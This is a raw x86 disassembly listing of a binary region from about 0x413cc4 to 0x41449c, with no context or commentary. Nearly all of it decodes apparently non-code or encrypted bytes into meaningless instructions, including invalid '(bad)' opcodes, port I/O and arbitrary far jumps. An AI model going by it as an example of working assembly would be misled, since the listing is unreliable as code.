  413cc4:	jns    0x413cc0
  413cc6:	fld    TBYTE PTR [ecx+0x7a753d4e]
  413ccc:	in     eax,dx
  413ccd:	popa   
  413cce:	mov    ebp,0xb98f05ea
  413cd3:	mov    esi,0x305ec71c
  413cd8:	sub    eax,0x48366e6c
  413cdd:	lock frstor [ebp-0x71]
  413ce1:	mov    esi,DWORD PTR [ecx-0x38b3d19c]
  413ce7:	mov    esp,0x7d1fa4b5
  413cec:	mov    esp,0xc82d152f
  413cf1:	xor    esi,esp
  413cf3:	or     al,0x96
  413cf5:	mov    bl,0xbc
  413cf7:	test   BYTE PTR [ebx],dh
  413cf9:	lods   al,BYTE PTR ds:[esi]
  413cfa:	or     esp,DWORD PTR [ecx]
  413cfc:	paddsw mm6,mm1
  413cff:	popa   
  413d00:	in     eax,dx
  413d01:	in     eax,0xbe
  413d03:	push   es
  413d04:	ins    BYTE PTR es:[edi],dx
  413d05:	jecxz  0x413ce9
  413d07:	pop    eax
  413d08:	call   0x66dfff62
  413d0d:	cmp    cl,al
  413d0f:	aas    
  413d10:	mov    eax,0x3342f850
  413d15:	mov    esi,0xc5f8c349
  413d1a:	ja     0x413cec
  413d1c:	add    edi,DWORD PTR [ebp-0x71dffda]
  413d22:	es mov ebp,ebp
  413d25:	push   esp
  413d26:	push   es
  413d27:	mov    ds:0x917ef98a,eax
  413d2c:	and    al,0x93
  413d2e:	repnz in eax,0xb4
  413d31:	xlat   BYTE PTR ds:[ebx]
  413d32:	mov    fs,WORD PTR [ecx-0x72]
  413d35:	mov    dl,0x71
  413d37:	pop    edx
  413d38:	out    dx,eax
  413d39:	iret   
  413d3a:	(bad)  
  413d3c:	aaa    
  413d3d:	mov    ds:0xdbbf2444,al
  413d42:	jo     0x413d4c
  413d44:	loope  0x413d47
  413d46:	xchg   esp,esp
  413d48:	test   eax,0x6eee27f4
  413d4d:	dec    esp
  413d4e:	mov    DWORD PTR [ecx+0x23e74ab],ecx
  413d54:	imul   ecx,edx,0x4077da37
  413d5a:	or     al,0x51
  413d5c:	dec    ebx
  413d5d:	dec    ebp
  413d5e:	xchg   ecx,eax
  413d5f:	cmp    bh,ch
  413d61:	dec    ebx
  413d62:	sub    ch,cl
  413d64:	inc    eax
  413d65:	xchg   edx,eax
  413d66:	pop    ebx
  413d67:	inc    ebx
  413d68:	jmp    0x2c91:0x70976757
  413d6f:	pop    ebx
  413d70:	and    eax,0x7cbbe785
  413d75:	bound  edx,QWORD PTR [edi+0x108fc85]
  413d7b:	sahf   
  413d7c:	sbb    dh,bh
  413d7e:	in     al,dx
  413d7f:	repnz (bad) 
  413d81:	rcl    DWORD PTR [eax],cl
  413d83:	pop    DWORD PTR [edi+0x73]
  413d86:	dec    edi
  413d87:	mov    esp,0x45067086
  413d8c:	mul    DWORD PTR [ebp-0x44b1075f]
  413d92:	xor    eax,0x8db28966
  413d97:	and    al,0x99
  413d99:	test   eax,0xe22342ce
  413d9e:	mov    ch,0x47
  413da0:	bound  eax,QWORD PTR [eax]
  413da2:	stc    
  413da3:	dec    ecx
  413da4:	(bad)  
  413da5:	fild   WORD PTR [esi+edx*8-0x68]
  413da9:	ficom  DWORD PTR [ebx-0x7d]
  413dac:	fld    DWORD PTR [ebx-0x3]
  413daf:	stos   BYTE PTR es:[edi],al
  413db0:	lock add eax,0xd836c321
  413db6:	sub    BYTE PTR [edx-0x58fe736a],dh
  413dbc:	cmp    ecx,DWORD PTR [ebx+0x341f7294]
  413dc2:	scas   eax,DWORD PTR es:[edi]
  413dc3:	aad    0x21
  413dc5:	push   0xd
  413dc7:	inc    ebp
  413dc8:	xchg   DWORD PTR [edx+0x72e2a216],esi
  413dce:	xor    dl,bh
  413dd0:	sbb    DWORD PTR [ebp-0x4f0abc07],0x2af38371
  413dda:	out    dx,al
  413ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ddc:	fadd   QWORD PTR [esi]
  413dde:	out    dx,eax
  413ddf:	ins    BYTE PTR es:[edi],dx
  413de0:	(bad)  
  413de1:	in     al,0x8f
  413de3:	push   edx
  413de4:	xlat   BYTE PTR ds:[ebx]
  413de5:	pushf  
  413de6:	mov    ds:0x1feb14a2,al
  413deb:	dec    eax
  413dec:	push   ebx
  413ded:	fstp   st(3)
  413def:	adc    al,0xa
  413df1:	ins    BYTE PTR es:[edi],dx
  413df2:	xor    al,dl
  413df4:	sbb    bl,0xb4
  413df7:	cmp    BYTE PTR [eax+0x72bb093d],0xdd
  413dfe:	lods   eax,DWORD PTR ds:[esi]
  413dff:	inc    edx
  413e00:	pop    esp
  413e01:	in     al,0x3c
  413e03:	sbb    eax,0x66f60404
  413e08:	pop    esi
  413e09:	cmp    ecx,ebp
  413e0b:	jae    0x413e20
  413e0d:	push   ss
  413e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e0f:	and    eax,DWORD PTR [esi]
  413e11:	mov    al,ds:0xb3b819b7
  413e16:	in     al,dx
  413e17:	loop   0x413e17
  413e19:	push   edi
  413e1a:	sub    DWORD PTR [esi-0x74],ebx
  413e1d:	inc    sp
  413e1f:	in     eax,0x38
  413e21:	js     0x413e57
  413e23:	pop    eax
  413e24:	jmp    DWORD PTR [ecx+0x60cd00f8]
  413e2a:	mov    cl,0x8c
  413e2c:	jmp    0x30ba8226
  413e31:	into   
  413e32:	scas   eax,DWORD PTR es:[edi]
  413e33:	pop    eax
  413e34:	rcr    ecx,1
  413e36:	push   0x8e583d64
  413e3b:	cmp    DWORD PTR ds:0xfab8bf43,edx
  413e41:	in     al,0xcb
  413e43:	sbb    eax,ebx
  413e45:	test   BYTE PTR [edx+0x7d],bl
  413e48:	adc    cl,BYTE PTR ds:0x70e8dc84
  413e4e:	js     0x413e6e
  413e50:	adc    al,0x24
  413e52:	pop    ds
  413e53:	push   edi
  413e54:	inc    ebp
  413e55:	jge    0x413eb2
  413e57:	mov    ds:0x68ec140c,al
  413e5c:	mov    ds:0xae25e428,eax
  413e61:	(bad)  
  413e62:	sbb    edx,esi
  413e64:	sbb    al,0x83
  413e66:	cmp    edx,DWORD PTR ss:[edx+eiz*8+0x3d4a32f2]
  413e6e:	inc    esi
  413e6f:	xor    al,dl
  413e71:	push   0x16
  413e73:	sub    edi,DWORD PTR [eax]
  413e75:	mov    ebp,0xbc9b51a6
  413e7a:	push   ecx
  413e7b:	in     eax,0xaf
  413e7d:	cmp    edx,esi
  413e7f:	ja     0x413e9a
  413e81:	inc    esi
  413e82:	or     eax,0xa2a80aee
  413e87:	adc    BYTE PTR [esi-0x9],dh
  413e8a:	fdivrp st(1),st
  413e8c:	int    0x3f
  413e8e:	(bad)  
  413e8f:	bound  eax,QWORD PTR [ebp+0x440d7523]
  413e95:	push   ebx
  413e96:	sbb    ch,BYTE PTR [ebx+edi*1+0x7d]
  413e9a:	test   ebx,edx
  413e9c:	rcl    BYTE PTR [ebp-0x26],cl
  413e9f:	ror    DWORD PTR [edi],cl
  413ea1:	scas   eax,DWORD PTR es:[edi]
  413ea2:	sti    
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	(bad)  
  413eb8:	out    0x28,eax
  413eba:	je     0x413eab
  413ebc:	push   es
  413ebd:	jg     0x413f37
  413ebf:	in     eax,0x7e
  413ec1:	js     0x413f3b
  413ec3:	push   ebp
  413ec4:	mov    edi,DWORD PTR [ebx+ebp*8]
  413ec7:	mov    DWORD PTR [edi],eax
  413ec9:	push   ebx
  413eca:	pop    esp
  413ecb:	enter  0xb5c9,0xc9
  413ecf:	sti    
  413ed0:	in     al,dx
  413ed1:	sbb    eax,0xb19bbf1a
  413ed6:	(bad)  
  413ed7:	gs mov bh,0x8b
  413eda:	jmp    0x413f53
  413edc:	pop    eax
  413edd:	scas   eax,DWORD PTR es:[edi]
  413ede:	adc    bh,BYTE PTR [ecx]
  413ee0:	mov    ebp,0x3e58abfa
  413ee5:	sahf   
  413ee6:	imul   ecx,DWORD PTR [ecx-0x57],0x8df27511
  413eed:	jbe    0x413ead
  413eef:	cmp    al,0xbb
  413ef1:	or     eax,0xcaa7fd9b
  413ef6:	jb     0x413e86
  413ef8:	scas   eax,DWORD PTR es:[edi]
  413ef9:	cld    
  413efa:	imul   esi,DWORD PTR [edx-0x6ffc5ad9],0x6b
  413f01:	dec    edx
  413f02:	ins    BYTE PTR es:[edi],dx
  413f03:	cwde   
  413f04:	imul   eax,DWORD PTR [edi+0xd6b9e87],0x2d
  413f0b:	jne    0x413ec7
  413f0d:	xor    eax,0xf3cfbfe4
  413f12:	dec    edx
  413f13:	inc    esi
  413f14:	ds fs (bad) 
  413f17:	jle    0x413f1b
  413f19:	out    dx,eax
  413f1a:	sub    edx,ebx
  413f1c:	xchg   ebp,eax
  413f1d:	data16 jl 0x413f55
  413f20:	std    
  413f21:	dec    ebp
  413f22:	cmc    
  413f23:	sub    al,0x70
  413f25:	iret   
  413f26:	cwde   
  413f27:	int3   
  413f28:	mov    esi,0x95068da5
  413f2d:	xchg   esi,eax
  413f2e:	push   ebp
  413f2f:	imul   ecx,DWORD PTR [ecx-0xa],0xffffffcd
  413f33:	or     al,0x99
  413f35:	mov    edi,0xba7f6e73
  413f3a:	jecxz  0x413f59
  413f3c:	jno    0x413f40
  413f3e:	pop    edi
  413f3f:	(bad)  
  413f40:	add    DWORD PTR [esp+esi*8-0x31eb85f6],ebp
  413f47:	repz sub eax,0xdf40e08e
  413f4d:	pop    eax
  413f4e:	sbb    eax,0x25e08238
  413f53:	das    
  413f54:	stc    
  413f55:	pop    ebp
  413f56:	sbb    al,ah
  413f58:	imul   esi,DWORD PTR [edx-0x5a5f7229],0x7cce0567
  413f62:	lock and edi,DWORD PTR [ebp-0x4d83b1ea]
  413f69:	fdivp  st(7),st
  413f6b:	fnsave [ebx+0x6d]
  413f6e:	pushf  
  413f6f:	fst    DWORD PTR [ebp*2-0x3f779187]
  413f76:	ret    
  413f77:	jl     0x413f28
  413f79:	cmp    dl,BYTE PTR [ebp+0x25]
  413f7c:	repz daa 
  413f7e:	stos   BYTE PTR es:[edi],al
  413f7f:	aam    0xe9
  413f81:	dec    ebx
  413f82:	popf   
  413f83:	adc    al,0x1b
  413f85:	sub    dl,BYTE PTR [esi]
  413f87:	jns    0x413ff1
  413f89:	rcr    ebx,0x57
  413f8c:	sahf   
  413f8d:	inc    ebx
  413f8e:	xchg   edx,eax
  413f90:	sub    DWORD PTR ds:0x45cb41ae,esp
  413f96:	loopne 0x413f8d
  413f98:	das    
  413f99:	dec    bl
  413f9b:	pushf  
  413f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f9d:	repnz repz cli 
  413fa0:	jp     0x413fd1
  413fa2:	shr    dl,0x6e
  413fa5:	sti    
  413fa6:	inc    eax
  413fa7:	int3   
  413fa8:	mov    eax,0xf4fb0261
  413fad:	inc    edi
  413fae:	arpl   WORD PTR [eax+0x7e],bx
  413fb1:	aam    0x30
  413fb3:	out    dx,al
  413fb4:	adc    eax,0x7eb76bcf
  413fb9:	inc    cl
  413fbb:	out    dx,eax
  413fbc:	push   ebp
  413fbd:	xor    esi,DWORD PTR [edi-0x22]
  413fc0:	aaa    
  413fc1:	jl     0x413f7e
  413fc3:	sbb    al,0x68
  413fc5:	into   
  413fc6:	stos   BYTE PTR es:[edi],al
  413fc7:	or     al,BYTE PTR [ebx-0x7fd1931b]
  413fcd:	sahf   
  413fce:	and    DWORD PTR [esi],edi
  413fd0:	aam    0x5f
  413fd2:	aam    0x5a
  413fd4:	xor    ah,BYTE PTR [edx-0x5f]
  413fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fd8:	and    BYTE PTR [esi+ebx*4],dh
  413fdb:	call   0xde402661
  413fe0:	cmp    al,0x1e
  413fe2:	dec    ebp
  413fe3:	in     eax,0x2b
  413fe5:	dec    esi
  413fe6:	mov    edx,esi
  413fe8:	jp     0x413f81
  413fea:	cdq    
  413feb:	cwde   
  413fec:	test   DWORD PTR [edi-0x1deab51],esi
  413ff2:	jl     0x413fc2
  413ff4:	add    eax,DWORD PTR ds:0xbdb9b720
  413ffa:	cmp    edx,DWORD PTR [ebp+0x5728ae8e]
  414000:	or     BYTE PTR [ebp-0x15],0xb7
  414004:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414005:	sub    BYTE PTR [ebx-0x50941c82],0x15
  41400c:	sbb    eax,0x3190a0c5
  414011:	shl    esp,1
  414013:	sbb    eax,0x30fd5859
  414018:	jmp    0xea0b:0x94b2f6aa
  41401f:	sbb    al,0x72
  414021:	loope  0x413fbb
  414023:	mov    edx,0x866db14e
  414028:	xor    ah,BYTE PTR [ebp-0xb]
  41402b:	iret   
  41402c:	push   0x51485c08
  414031:	mov    bl,0x92
  414033:	dec    ebx
  414034:	inc    ebp
  414035:	inc    esp
  414036:	add    eax,0xabb0e826
  41403b:	cdq    
  41403c:	in     al,0x17
  41403e:	mov    esi,0x29b5ae7c
  414043:	jne    0x414018
  414045:	imul   eax,edx,0xffffff8a
  414048:	sub    ch,BYTE PTR ds:0x524bea1
  41404e:	scas   eax,DWORD PTR es:[edi]
  41404f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414050:	mov    esi,0x6abc3546
  414055:	cwde   
  414056:	lods   eax,DWORD PTR ds:[esi]
  414057:	jg     0x41409c
  414059:	ror    BYTE PTR ds:0xb5d07496,0xf8
  414060:	test   eax,0xcaf1b2af
  414065:	std    
  414066:	mov    edi,0x6733ce8
  41406b:	test   BYTE PTR [edi+0x412a598f],cl
  414071:	xchg   ebp,eax
  414072:	and    DWORD PTR [ebp-0x62a9401],ecx
  414078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414079:	mov    al,BYTE PTR [edx+0x76]
  41407c:	add    al,0xa2
  41407e:	push   0x165d4e96
  414083:	stos   DWORD PTR es:[edi],eax
  414084:	adc    DWORD PTR ds:0xd102a164,ecx
  41408a:	sti    
  41408b:	call   DWORD PTR [ecx+0x616185f9]
  414091:	dec    ebx
  414092:	dec    ebx
  414093:	fdiv   QWORD PTR [eax+edx*4+0x7b336917]
  41409a:	jae    0x4140ec
  41409c:	mov    cs,WORD PTR [esp+esi*1]
  41409f:	bt     DWORD PTR [eax-0x32],edx
  4140a3:	pop    ds
  4140a4:	dec    esi
  4140a5:	test   cl,dl
  4140a7:	mov    dl,0xfc
  4140a9:	xchg   edi,eax
  4140aa:	xchg   BYTE PTR [edi+0x6677251b],ch
  4140b0:	mov    esi,0xa51030f8
  4140b5:	(bad)  
  4140b6:	mov    ebp,0xf47871d1
  4140bb:	call   0x35f871b5
  4140c0:	adc    DWORD PTR [edx-0x342480ad],ebp
  4140c6:	jle    0x414056
  4140c8:	xchg   esi,eax
  4140c9:	dec    eax
  4140ca:	ins    DWORD PTR es:[edi],dx
  4140cb:	pop    ebp
  4140cc:	push   edx
  4140cd:	daa    
  4140ce:	iret   
  4140cf:	xchg   ebp,eax
  4140d0:	sbb    dh,cl
  4140d2:	dec    eax
  4140d3:	mov    ch,0x75
  4140d5:	fstp   TBYTE PTR [edx]
  4140d7:	sbb    DWORD PTR [eax],esp
  4140d9:	xor    cl,dl
  4140db:	mov    ds:0x7d472d68,al
  4140e0:	out    dx,eax
  4140e1:	jbe    0x414109
  4140e3:	retf   
  4140e4:	sti    
  4140e5:	fdiv   DWORD PTR [edi+edx*8]
  4140e8:	sub    ebx,DWORD PTR [eax+0x217ba3fd]
  4140ee:	mov    cl,0xbe
  4140f0:	xchg   ebp,eax
  4140f1:	rol    BYTE PTR [ecx],0xa9
  4140f4:	test   eax,0x69d0f947
  4140f9:	cmp    al,0xfa
  4140fb:	inc    eax
  4140fc:	aad    0xde
  4140fe:	retf   0x1c64
  414101:	loope  0x41413f
  414103:	mov    bh,0x7d
  414105:	pusha  
  414106:	out    dx,al
  414107:	call   0x6079:0x95eccba0
  41410e:	popf   
  41410f:	in     al,0x25
  414111:	adc    eax,0x7e2d9ada
  414116:	lds    esp,FWORD PTR [ecx-0x63]
  414119:	scas   al,BYTE PTR es:[edi]
  41411a:	xor    BYTE PTR [ecx],cl
  41411c:	stos   BYTE PTR es:[edi],al
  41411d:	or     eax,0x71560909
  414122:	jnp    0x41416d
  414124:	adc    DWORD PTR [edx+0x1671a662],0x7d
  41412b:	cwde   
  41412c:	mov    al,ds:0xe9d83315
  414131:	add    DWORD PTR [edx],0x0
  414134:	add    ah,al
  414136:	aas    
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0xa5145a14
  414142:	mov    bl,0x73
  414144:	addr16 push esp
  414146:	add    al,0x7f
  414148:	js     0x41412f
  41414a:	jle    0x4141c4
  41414c:	js     0x4140d3
  41414e:	push   ebp
  41414f:	pop    ebp
  414150:	dec    ebx
  414151:	sbb    al,0x73
  414153:	pop    esp
  414154:	sti    
  414155:	mov    edi,0x5be1866c
  41415a:	cld    
  41415b:	dec    ebx
  41415c:	cmp    bh,BYTE PTR [esi]
  41415e:	jne    0x41410c
  414160:	inc    ebx
  414161:	push   es
  414162:	inc    ecx
  414163:	test   BYTE PTR [ebx+0x18de4ad2],al
  414169:	pop    es
  41416a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41416b:	shl    DWORD PTR [edx+0x43],0xd2
  41416f:	daa    
  414170:	pop    eax
  414171:	shr    BYTE PTR [edx],1
  414173:	xchg   esi,eax
  414174:	or     BYTE PTR [edx+0x771f10b0],bl
  41417a:	pop    es
  41417b:	sahf   
  41417c:	arpl   WORD PTR [edi-0x6e],cx
  41417f:	pop    ecx
  414180:	adc    BYTE PTR [ecx+0x4f],bh
  414183:	xchg   esp,eax
  414184:	dec    edx
  414185:	fisttp DWORD PTR [edx-0x3a1be990]
  41418b:	nop
  41418c:	ret    
  41418d:	add    BYTE PTR [esi-0x75],bh
  414190:	rcl    DWORD PTR ds:0x759dcb63,1
  414196:	fldcw  WORD PTR [edi+0x6d]
  414199:	cmp    ecx,edx
  41419b:	mov    ds:0xf164e59b,al
  4141a0:	stc    
  4141a1:	aas    
  4141a2:	cdq    
  4141a3:	jle    0x41421f
  4141a5:	mov    ebp,DWORD PTR [edi-0x2f70c27e]
  4141ab:	xchg   ebx,esi
  4141ad:	pop    ds
  4141ae:	mov    eax,ds:0x3c466ff7
  4141b3:	repnz inc edi
  4141b5:	daa    
  4141b6:	add    ebx,DWORD PTR [edi]
  4141b8:	xor    al,0xfd
  4141ba:	mov    ds,WORD PTR [ecx]
  4141bc:	test   al,0x1f
  4141be:	jge    0x41418e
  4141c0:	sbb    eax,0xdcd0234f
  4141c5:	xor    eax,0x9725cfd8
  4141ca:	jge    0x41418d
  4141cc:	stc    
  4141cd:	mov    ebx,0xe96ab8e5
  4141d2:	je     0x414236
  4141d4:	mov    ebp,0x5aba24e4
  4141d9:	cmp    bh,BYTE PTR [edi]
  4141db:	leave  
  4141dc:	and    al,ch
  4141de:	out    dx,al
  4141df:	pop    ds
  4141e0:	enter  0xcee5,0x53
  4141e4:	sbb    DWORD PTR [edx+edx*8+0x1e350697],0xffffffbe
  4141ec:	(bad)  
  4141ed:	jbe    0x414236
  4141ef:	cmp    ebp,eax
  4141f1:	cmp    edx,DWORD PTR [ecx]
  4141f3:	cmc    
  4141f4:	int3   
  4141f5:	(bad)  
  4141f6:	loope  0x4141a4
  4141f8:	dec    edx
  4141f9:	xchg   bl,dh
  4141fb:	xor    DWORD PTR [edx],esi
  4141fd:	or     ah,BYTE PTR [eax+0x5a37c740]
  414203:	ins    DWORD PTR es:[edi],dx
  414204:	loope  0x4141af
  414206:	sbb    eax,0xb0f44eab
  41420b:	sub    DWORD PTR [edx-0x75df898b],0x37
  414212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414213:	mov    ebx,0xab5f1606
  414218:	jmp    0xe0dcab98
  41421d:	adc    BYTE PTR [eax-0x7f31873c],ch
  414223:	xchg   esi,eax
  414224:	add    DWORD PTR [eax+0x3c3dbb0e],ebx
  41422a:	cdq    
  41422b:	sub    ah,BYTE PTR [esi-0x68f54700]
  414231:	or     al,0x79
  414233:	fidiv  DWORD PTR [ebx-0x14]
  414236:	adc    dl,BYTE PTR [edx]
  414238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414239:	lods   eax,DWORD PTR ds:[esi]
  41423a:	sar    DWORD PTR [ecx],1
  41423c:	dec    ebp
  41423d:	pop    ebx
  41423e:	jnp    0x4141d8
  414240:	jmp    0x478087e4
  414245:	lock dec eax
  414247:	fdiv   QWORD PTR [eax+eiz*4-0x1d]
  41424b:	xchg   edx,eax
  41424c:	dec    esp
  41424d:	sbb    edi,edi
  41424f:	fst    QWORD PTR [edx]
  414251:	jmp    0x414211
  414253:	mov    fs,esp
  414255:	mov    dh,ah
  414257:	mov    ebp,DWORD PTR [edx+0x6c]
  41425a:	xlat   BYTE PTR ds:[ebx]
  41425b:	add    al,ch
  41425d:	adc    eax,0x97b265c0
  414262:	xor    ecx,0x1412a7ab
  414268:	jecxz  0x4142cc
  41426a:	mov    ebp,0xef87f92b
  41426f:	cdq    
  414270:	xchg   edx,eax
  414271:	add    dl,dh
  414273:	push   ebp
  414274:	repnz xchg edx,eax
  414276:	stc    
  414277:	stos   DWORD PTR es:[edi],eax
  414278:	test   al,0xac
  41427a:	scas   eax,DWORD PTR es:[edi]
  41427b:	mov    cs,WORD PTR [esi]
  41427d:	pop    es
  41427e:	leave  
  41427f:	fwait
  414280:	cs call 0xcb2c:0xdb83f725
  414288:	push   ecx
  414289:	(bad)  
  41428a:	jmp    0x414301
  41428c:	test   DWORD PTR [ebp-0x11],esi
  41428f:	add    eax,0xa19616ed
  414294:	mov    BYTE PTR [ebp+0x7],bl
  414297:	retf   0xd383
  41429a:	pop    ebp
  41429b:	xor    BYTE PTR [ebp-0x3],cl
  41429e:	je     0x4142ad
  4142a0:	das    
  4142a1:	or     BYTE PTR [esi-0x6],dl
  4142a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142a5:	pop    ebp
  4142a6:	mov    ah,0x9c
  4142a8:	jge    0x41426d
  4142aa:	in     al,0x22
  4142ac:	out    0xe9,eax
  4142ae:	nop
  4142af:	sub    eax,0x64686e5b
  4142b4:	push   ecx
  4142b5:	out    dx,al
  4142b6:	loope  0x414272
  4142b8:	push   0x48369c38
  4142bd:	(bad)  
  4142be:	shl    DWORD PTR [ecx],cl
  4142c0:	in     al,0x89
  4142c2:	cmp    eax,0x1470c32
  4142c7:	or     al,0x72
  4142c9:	loopne 0x41427c
  4142cb:	dec    edx
  4142cc:	or     bh,dh
  4142ce:	mov    ds:0x30d1d78c,al
  4142d3:	mov    eax,ds:0xb6d9806a
  4142d8:	addr16 push 0xffffffef
  4142db:	ret    0x277e
  4142de:	cmp    eax,esi
  4142e0:	pop    edx
  4142e1:	ret    
  4142e2:	jnp    0x41432b
  4142e4:	xor    DWORD PTR [edx+0x269e866],esp
  4142ea:	stos   DWORD PTR es:[edi],eax
  4142eb:	in     eax,dx
  4142ec:	jnp    0x41430f
  4142ee:	call   ebp
  4142f0:	adc    al,0xbd
  4142f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142f3:	mov    dh,0x90
  4142f5:	mov    ch,0x75
  4142f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142f8:	adc    DWORD PTR [eax],esp
  4142fa:	xor    DWORD PTR [edx-0x35],edx
  4142fd:	jns    0x4142bd
  4142ff:	sbb    BYTE PTR [eax],0x48
  414302:	loopne 0x4142d4
  414304:	aad    0xc1
  414306:	cli    
  414307:	mov    WORD PTR [ebx],fs
  414309:	test   BYTE PTR [edi+edx*2+0x6df1c4d0],0xa8
  414311:	test   eax,0xfc020432
  414316:	push   edx
  414317:	add    ecx,edx
  414319:	pop    edi
  41431a:	out    dx,eax
  41431b:	mov    ecx,0x1f5a2b97
  414320:	and    bh,BYTE PTR [ebx+eiz*8-0x24fc5708]
  414327:	lods   eax,DWORD PTR ds:[esi]
  414328:	push   0x1e90da00
  41432d:	(bad)  
  41432e:	fcmove st,st(5)
  414330:	jle    0x414374
  414332:	jmp    0x86298c10
  414337:	mov    dl,0xa2
  414339:	push   esp
  41433a:	outs   dx,BYTE PTR ds:[esi]
  41433b:	xor    al,0x4a
  41433d:	push   esi
  41433e:	add    dh,dl
  414340:	xor    cl,BYTE PTR [eax-0x38]
  414343:	xchg   esi,eax
  414344:	jecxz  0x4142fa
  414346:	sbb    DWORD PTR [edx-0x2bbada88],esi
  41434c:	ja     0x414304
  41434e:	mov    edi,0x5901d520
  414353:	js     0x4143a5
  414355:	push   edi
  414356:	aam    0x3f
  414358:	pop    edx
  414359:	scas   eax,DWORD PTR es:[edi]
  41435a:	aam    0x57
  41435c:	mov    ah,0xfe
  41435e:	push   eax
  41435f:	mov    edi,0x5cfac978
  414364:	sbb    al,0x2e
  414366:	sbb    ebx,DWORD PTR [esi+edi*8]
  414369:	out    dx,eax
  41436a:	hlt    
  41436b:	ror    BYTE PTR [ecx+0x42417af1],1
  414371:	sub    DWORD PTR [eax+0x55a70f25],edi
  414377:	cmp    dl,BYTE PTR [eax+0x43bbd1fc]
  41437d:	push   ds
  41437e:	outs   dx,DWORD PTR ds:[esi]
  41437f:	dec    ecx
  414380:	pop    esp
  414381:	mov    dh,0xce
  414383:	fs call 0x1231b34
  414389:	xchg   DWORD PTR [ebx+eax*2+0x6b912ebe],edx
  414390:	xor    eax,0xeffe3368
  414395:	cwde   
  414396:	fcom   QWORD PTR [ecx-0xc]
  414399:	leave  
  41439a:	cmp    eax,0x88f0bd90
  41439f:	inc    ebp
  4143a0:	xchg   ebx,eax
  4143a1:	xor    BYTE PTR [ecx],ch
  4143a3:	cmp    DWORD PTR [edx-0x17],0x7b
  4143a7:	cmp    eax,0x6d019780
  4143ac:	add    ah,BYTE PTR [esi-0x25608ca7]
  4143b2:	test   BYTE PTR [esi],0x67
  4143b5:	or     BYTE PTR [edx+0x49],ah
  4143b8:	sub    edx,ecx
  4143ba:	lea    edi,[edi+ebx*1+0x327298]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	push   ss
  4143e5:	popa   
  4143e6:	outs   dx,BYTE PTR es:[esi]
  4143e8:	ror    DWORD PTR [ecx],0x7f
  4143eb:	js     0x4143d2
  4143ed:	jle    0x414467
  4143ef:	js     0x4143d7
  4143f1:	jae    0x414382
  4143f3:	leave  
  4143f4:	mov    eax,ds:0x34d258f
  4143f9:	inc    ebp
  4143fa:	and    eax,0xff22460e
  4143ff:	bound  eax,QWORD PTR [ecx+0x1dd8b152]
  414405:	mov    BYTE PTR [edi-0x62],0x8d
  414409:	pushf  
  41440a:	test   ebx,ecx
  41440c:	out    0xc1,eax
  41440e:	jmp    0x4143b1
  414410:	adc    al,0xd5
  414412:	ins    DWORD PTR es:[edi],dx
  414413:	inc    edi
  414414:	dec    edi
  414415:	outs   dx,DWORD PTR ds:[esi]
  414416:	in     al,dx
  414417:	stc    
  414418:	repz mov ebp,0xb77d6698
  41441e:	test   DWORD PTR [esi-0x57444b60],ecx
  414424:	addr16 sub ebx,0x679ee70a
  41442b:	xchg   esp,eax
  41442c:	pop    ss
  41442d:	inc    edx
  41442e:	fnstenv [ecx-0x72c605e5]
  414434:	aaa    
  414435:	mov    BYTE PTR [ecx],dl
  414437:	and    eax,0xa7f9ead2
  41443c:	imul   ebp,DWORD PTR [esi+0x1d],0xffffffab
  414440:	jge    0x414421
  414442:	outs   dx,BYTE PTR ds:[esi]
  414443:	loopne 0x414467
  414445:	push   ecx
  414446:	dec    ebp
  414447:	lahf   
  414448:	dec    esi
  414449:	dec    edx
  41444a:	xchg   ebp,eax
  41444b:	mov    ds,eax
  41444d:	push   ds
  41444e:	in     eax,0x2b
  414450:	test   eax,0x3fc9de4b
  414455:	sub    edx,ebp
  414457:	jne    0x4144c3
  414459:	xor    DWORD PTR [esi+eax*2+0x54],ebp
  41445d:	rep ins BYTE PTR es:[edi],dx
  41445f:	es xchg edi,eax
  414461:	lds    eax,FWORD PTR [esi-0x102bdc6d]
  414467:	call   FWORD PTR [ecx-0x71]
  41446a:	dec    eax
  41446b:	fdivr  QWORD PTR [ebp+0x46]
  41446e:	pop    ebx
  41446f:	mov    ds:0xc3660700,eax
  414474:	int3   
  414475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414476:	push   ecx
  414477:	lds    ebx,FWORD PTR [edi]
  414479:	maskmovq mm7,(bad)
  41447a:	idiv   DWORD PTR [ecx-0x21abe053]
  414480:	sti    
  414481:	sub    al,0x8a
  414483:	xchg   ebp,eax
  414484:	scas   eax,DWORD PTR es:[edi]
  414485:	xor    esp,edi
  414487:	imul   esp,ebp,0xb09886cc
  41448d:	fmul   QWORD PTR [ecx]
  41448f:	scas   eax,DWORD PTR es:[edi]
  414490:	mov    ebx,0x7c7e16b6
  414495:	icebp  
  414496:	retf   0xefa9
  414499:	data16 das 
  41449b:	xchg   esp,eax
  41449c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
